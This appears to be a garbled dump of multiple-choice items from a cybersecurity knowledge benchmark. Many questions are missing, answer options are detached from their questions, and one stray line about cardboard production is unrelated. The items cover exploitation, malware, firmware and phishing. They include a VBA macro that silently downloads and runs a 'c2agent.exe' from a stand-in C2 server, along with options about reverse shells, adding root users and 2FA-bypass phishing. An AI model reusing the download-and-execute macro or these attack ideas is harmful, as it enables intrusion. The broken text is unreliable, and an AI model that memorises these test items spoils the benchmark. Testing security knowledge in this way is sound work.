questions.question: Which of the following might explain why a certain user account on a Windows system configured to default to LM hashes only has an NT hash stored?

choices.text: A special character was used in the password
The password is at least 12 characters in length

questions.question:
What does the following VBA macro do? ```Sub powershell()
'
' Powershell Macro
'
'
Dim PSResponse As String
PSResponse = Shell("PowerShell (New-Object System.Net.WebClient).
DownloadFile('http://ourc2server.com/download/c2agent.exe','agent.
exe'");Start-Process 'agent.exe'", vbHide)
End Sub```

choices.text: Connects to the website http://ourc2server.com, injects the agentc2.exe file into an already running non-malicious process in the system, and then executes it.
Downloads the agentc2.exe file from http://ourc2server.com, stores it as agent.exe in the working directory, and executes it.
Downloads the agentc2.exe file from http://ourc2server.com, executes it directly in memory without storing it on disk.
Downloads the agentc2.exe file from an internal server, stores it as a temp file, executes it, and then automatically deletes it after execution.

choices.text: At the top of the stack

You are attempting to set up a fuzzing environment with a specific firmware for a ARMv7m microcontroller. You are given the c source code, and are using gcc to build an object file and GNU linker to create the final firmware image. After running the following commands,
 gcc -c -o firmware.o firmware.c -ffunction-sections
 
 ld -T script.ld -o firmware firmware.o ‚Ä¶ (other source files)
 
 you determine that the resulting binary is too large and exceeds the size of available flash memory. To fix this issue you run
 
 ld --gc-sections -T script.ld -o firmware firmware.o ‚Ä¶ (other source files)
 
 After successfully uploading the updated binary, the microcontroller fails to boot and shows unpredictable behavior.
 
 Given that the linker script contains no semantic errors, what is the issue and how can it be fixed?

choices.text: ld should not have been used for linking. gcc -Wl, -T, script.ld -o firmware firmware.c ‚Ä¶ (other source files) should be used instead
There are necessary input sections missing from the binary that were removed because of --gc-sections. Optimizing the size should instead be handled by gcc.
There is a bug in the firmware code that is only exposed when using the --gc-sections option. Debug the firmware code to identify and resolve the underlying issue
Some symbols were removed by --gc-sections because they were unused in the source code. exceptions.o should be explicitly not removed in the linker script.

Yes, because other parts of the stack may have been corrupted.

choices.text: Use the administrative interface on the landscape client to give root privileges to the current user.
Make a reverse shell callback using port 953.
Abuse SUID bit on apache2 to run with root privileges.
Modify the passwd file to add a new root user.

How does the FLASHFLOOD malware archive collected data?

choices.text: Data is encoded with Base64, and then compressed with gzip.
Data is encrypted with AES-256, and then compressed with LZW.
Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.
Data is encrypted with RSA-2048, and then compressed with LZ77.

Which of the following describes a system’s TCB?

choices.text: It only includes the software you develop yourself (e.g., it has been audited or formally verified)
It represents the portion of the system that you have reason to trust , regardless of whether this portion is likely to be executed
It includes any component whose failure will undermine your system’s security
The TCB is the most privileged layer of software in the system (e.g., the OS or VMM)
The attacker can input a negative value when withdrawing money, which will in turn add money to their account.

The attacker can input a very large number when attempting to withdraw money. This will cause an integer overflow, and cause the program to try and subtract a negative value, which will in turn add money to the user's account.
Use a long username to overwrite the money variable.
The attacker can input a very large input value when asked: "Enter your choice". A large value will cause an integer overflow which can then lead to arbitrary code execution or data corruption.

choices.text: Security Callbacks can be cached, under certain circumstances, A can call X, have the security callback response cached, then call Y, but only if they never reconnect to the interface

To restrict the permissions of shared resources for improved access control.
To eliminate the race window of vulnerability for concurrent processes/threads.
To encrypt the critical sections of the code to prevent access by attackers.
The only way to write null bytes that may exist in the payload (such as a code addresses) is to abuse the null terminator placed by the string functions.
The level requires users to bypass stack cookies which requires them to first leak the cookie, then overwrite it using strcat.
The program explicitly limits how much stack data can be read in at once, requiring several iterations to read a big ROP chain into memory.

This could happen during the drying or curing stages of the cardboard production process.

Assume a zero'd buffer then securely receives data via fgets to partially fill the buffer. Why is the line containing strcspn considered unsafe?

choices.text: It will write a null byte out of bounds of the buffer.

strcspn does not ensure the string will be null terminated.
The given line of code is perfectly safe.

questions.question: What is a downside of using the n-gram model for malware feature extraction?

Every sequence may not be related
It only works with dynamic attributes
The researcher is wrong because the function only needs, at minimum, a pointer-length of stack storage. 0x20 is enough for multiple pointers.
The researcher is correct, although the program may not crash, the struct will take up 4 more bytes than was allocated because 36-32 is 4.
The researcher is correct and the program will crash because overwriting by 4 bytes will corrupt the saved rbp on the stack
The researcher is wrong because the size of the struct is actually only 32 on the architecture where this program will be run.

A legacy system uses a secret key held internally within the CPU to decrypt its bootloader with RC4 and begin execution after checking that the last four bytes of the bootloader match a known good value. Why is this a bad design for establishing a chain of trust?

choices.text: This is a bad idea because the secret key is stored in the CPU, which can be compromised by a side-channel attack that exploits the power consumption, electromagnetic radiation, or timing behavior of the processor.
This is a bad idea because RC4 is a stream cipher that can be easily broken by a ciphertext-only attack, and the last four bytes of the bootloader are likely to be known or guessable.
This is a bad idea because the bootloader is decrypted in memory, which can be exposed by a cold boot attack that exploits the remanence of data in RAM after power loss or a reset.

This is a bad idea because the bootloader is not authenticated by a cryptographic hash function, and checking the last four bytes of the bootloader is not a secure way to ensure the integrity of the bootloader.

Fuzzing will eventually cover all branches
Use jump instruction tracing to detect jump target constants
Use compare instruction tracing to detect constant comparisons

You are attempting to discover undocumented vendor commands that could enable you to reflash the firmware on a HDD with a rootkit, or bricking image. There appears to be some kind of flash chip on the HDD controller that likely contains some of the device firmware, but MCU uses an unknown, custom instruction set architecture (ISA). What is the most reasonable place to start?

choices.text: Use differential power analysis against the MCU to study its custom ISA.
Reverse any PC-based utils published by the vendor that can configure or update the drive.
Extract the vendor filesystem from private sectors on the disk using xxd & objdump.
Dump the flash using a physical programmer and inspect its contents with binwalk.

questions.question: You are attempting to compromise a reasonably security conscious individual via a spear-phish email. They are pretty careful about which emails they open and which attachments they download. What method may prove more successful at compromising their machine over time?

choices.text: Send a generic newsletter from a legitimate looking business with an unsubscribe link at the bottom, leading to a page hosting a browser-based zero-day exploit.

After restarting your instance of Cobalt Strike on an air gapped network, the program fails to launch correctly. You have a renewed license, but you're not sure if your Cobalt Strike instance is aware of this. How can you fix this issue without breaking the air gap?

choices.text: Sign into your Cobalt Strike account and downlad the cobaltstrike.jar and cobaltstrike.auth files. Then copy them to your air gapped system.
Set up a licensing USB with your Cobalt Strike account. Then plug this into your air gapped system.
Set up a Cobalt Strike instance with your license on a system with an internet connection. Then take the cobaltstrike.jar and cobaltstrike.auth files and move them to your air gapped system.

  push %rbp
  mov %rsp,%rbp
  sub $0x40,%rsp
  mov %rdi,%r10
  xor %rdi,%rdi
  lea -0x38(%rbp),%rax
  mov $0x2a,-0x8(%rbp)
  mov %r10,-0x10(%rbp)
 
  ; More code here that does not change %rax
  ; Call to memcpy with:
  ; length = 100
  ; dst = %rax
  ; src pointing to an attacker controlled string
  ; Neither the omitted code nor memcpy changes the value of %r10
 
  mov -0x8(%rbp),%rax
  cmp %rax,$0x2a
  jne $0x400470 <proccess_kill@plt>
  mov -0x10(%rbp),%rbx
  cmp %rbx,%r10
  jne $0x400470 <proccess_kill@plt> 
 If an attacker wants to hijack control by overwriting the function's return address, where should the two values in the previous question be written?

The program will ignore the breakpoint and execute as it normally would since it's not the first byte of the instruction.
The program will break on the instruction after your breakpoint.

questions.question:
Which of the following code snippets correctly re-implements the functionality of the following bytes of assembly when interpreted by a x86-64 CPU? 
 
 48C7C0414141414831F8480541414141

choices.text:
def xor(a):
  a ^= 0x41414141
  a += 0x41414141
  return a

def xor(a):
  a ^= 0x41414141
  a += 0x41414141
  return a & 0xffffffffffffffff

def xor(a):
  a ^= 0x41414141
  a += 0x41414141
  return a & 0xffffffff

Phishing with Two-Factor Authentication Bypass: Craft phishing emails that not only trick employees into providing login credentials but also capture and exploit two-factor authentication codes.
DNS Spoofing: Redirect the company's domain to a fake website and trick users into entering their cloud credentials.
Man-in-the-Middle (MitM) Attack: Intercept communication between the company's employees and the cloud server to gain access to sensitive data.
